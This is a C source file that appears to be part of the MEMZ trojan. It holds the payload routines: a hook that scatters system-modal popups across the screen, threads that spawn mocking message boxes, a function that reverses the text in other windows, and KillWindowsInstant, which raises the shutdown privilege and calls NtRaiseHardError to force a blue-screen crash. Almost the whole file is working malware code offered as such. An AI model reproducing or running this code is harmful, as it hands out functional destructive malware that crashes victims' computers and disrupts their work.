#include "MEMZ.h"

// Random-Generator
HCRYPTPROV hProv;
INT Random() {
	if (hProv == NULL) {
		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT)) {
			if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, NULL))
				ExitProcess(EXIT_FAILURE);
		}
	}

	int out;
	CryptGenRandom(hProv, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}

// MessageBoxHook
LRESULT CALLBACK MsgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hWnd = (HWND)wParam;

			int x = Random() % (scrw - pcs->cx);
			int y = Random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

// MessageBoxThread's
DWORD WINAPI MessageBoxThread(LPVOID lpParameter) {
	HHOOK Hook = SetWindowsHookEx(WH_CBT, MsgBoxHook, NULL, GetCurrentThreadId());
	MessageBox(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(Hook);

	return 0;
}
DWORD WINAPI RipMessageThread(LPVOID lpParameter) {
	HHOOK Hook = SetWindowsHookEx(WH_CBT, MsgBoxHook, NULL, GetCurrentThreadId());
	MessageBox(NULL, Msgs[Random() % nMsgs], L"MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(Hook);

	return 0;
}

// String-Reverse
BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 0x2000);

	if (SendMessageTimeout(hWnd, WM_GETTEXT, 0x2000, (LPARAM)str, SMTO_ABORTIFHUNG, 0x64, NULL)) {
		StrReverse(str);
		SendMessageTimeout(hWnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 0x64, NULL);
	}

	GlobalFree(str);

	return TRUE;
}
VOID StrReverse(LPWSTR str) {
	int len = lstrlen(str);

	if (len <= 0x1)
		return;

	WCHAR c;
	int i, j;
	for (i = 0, j = len - 0x1; i < j; i++, j--) {
		c = str[i];
		str[i] = str[j];
		str[j] = c;
	}

	for (i = 0; i < len - 0x1; i++) {
		if (str[i] == L'\n' && str[i + 1] == L'\r') {
			str[i] = L'\r';
			str[i + 1] = L'\n';
		}
	}
}

// KillWindows Host
VOID KillWindows() {
	// Spawn KillMessages
	for (int i = 0; i < 0x80; i++) {
		CreateThread(NULL, 0x1000, &RipMessageThread, NULL, NULL, NULL);
		Sleep(16);
	}

#ifdef BSOD
	KillWindowsInstant();
#else
	Sleep(8192);
	ExitProcess(EXIT_SUCCESS);
#endif
}

#ifdef BSOD
// BSoD Windows
VOID KillWindowsInstant() {
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(0x13, TRUE, FALSE, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 0x6, &Response);
}
#endif